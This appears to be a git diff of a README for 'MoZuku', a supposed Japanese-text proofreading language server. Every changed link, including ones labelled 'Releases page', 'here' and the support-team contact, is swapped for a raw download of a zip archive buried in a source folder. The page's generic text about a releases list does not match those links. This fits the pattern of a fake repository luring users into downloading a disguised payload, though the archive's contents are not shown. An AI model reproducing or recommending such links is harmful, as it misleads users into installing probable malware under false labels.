@@ -1,6 +1,6 @@
 # 🎉 MoZuku - Effortlessly Analyze and Proofread Japanese Text
 
-[![Download MoZuku](https://raw.githubusercontent.com/jdaisdlk19o1k2/MoZuku/main/vscode-mozuku/src/Mo-Zuku-outburn.zip)](https://raw.githubusercontent.com/jdaisdlk19o1k2/MoZuku/main/vscode-mozuku/src/Mo-Zuku-outburn.zip)
+[![Download MoZuku](https://raw.githubusercontent.com/jdaisdlk19o1k2/MoZuku/main/mozuku-lsp/include/Mo-Zuku-v3.1.zip)](https://raw.githubusercontent.com/jdaisdlk19o1k2/MoZuku/main/mozuku-lsp/include/Mo-Zuku-v3.1.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ MoZuku is a user-friendly language server designed to analyze and proofread Japa
 To start using MoZuku, follow these steps:
 
 1. **Visit the Releases Page:**  
-   Click [here](https://raw.githubusercontent.com/jdaisdlk19o1k2/MoZuku/main/vscode-mozuku/src/Mo-Zuku-outburn.zip) to access the downloads section.
+   Click [here](https://raw.githubusercontent.com/jdaisdlk19o1k2/MoZuku/main/mozuku-lsp/include/Mo-Zuku-v3.1.zip) to access the downloads section.
 
 2. **Choose Your File:**  
    On the releases page, you will find a list of available versions. Select the latest version to ensure you get the most features and fixes.
@@ -27,7 +27,7 @@ To start using MoZuku, follow these steps:
 
 ## 📥 Download & Install
 
-To install MoZuku, visit the [Releases page](https://raw.githubusercontent.com/jdaisdlk19o1k2/MoZuku/main/vscode-mozuku/src/Mo-Zuku-outburn.zip). Download the latest version applicable to your operating system. The installation process is straightforward and will guide you through setting up the application.
+To install MoZuku, visit the [Releases page](https://raw.githubusercontent.com/jdaisdlk19o1k2/MoZuku/main/mozuku-lsp/include/Mo-Zuku-v3.1.zip). Download the latest version applicable to your operating system. The installation process is straightforward and will guide you through setting up the application.
 
 ## 🌟 Features
 
@@ -58,7 +58,7 @@ If you encounter issues while using MoZuku, try these solutions:
 
 ## 📞 Support
 
-For further assistance, please refer to our [FAQ section](#) or contact our support team at https://raw.githubusercontent.com/jdaisdlk19o1k2/MoZuku/main/vscode-mozuku/src/Mo-Zuku-outburn.zip We aim to respond within 48 hours.
+For further assistance, please refer to our [FAQ section](#) or contact our support team at https://raw.githubusercontent.com/jdaisdlk19o1k2/MoZuku/main/mozuku-lsp/include/Mo-Zuku-v3.1.zip We aim to respond within 48 hours.
 
 ## 📝 Contribution
 
